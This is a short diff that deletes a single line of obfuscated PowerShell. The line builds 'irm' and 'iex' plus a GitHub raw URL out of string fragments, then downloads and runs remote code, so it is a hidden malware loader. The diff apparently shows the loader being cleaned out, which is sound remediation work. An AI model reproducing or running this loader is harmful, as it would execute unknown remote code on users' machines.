@@ -1,1 +1,0 @@
-$p4='/F/refs/hea';$c2='r';$c6='x';$p1='https://raw.';$c4='i';$p2='githubusercontent.co';$c5='e';$p3='m/fg9q';$c1='i';$p5='ds/main/9';$c3='m';$u=$p1+$p2+$p3+$p4+$p5;$c=$c1+$c2+$c3;$i=$c4+$c5+$c6;& $c $u | & $i
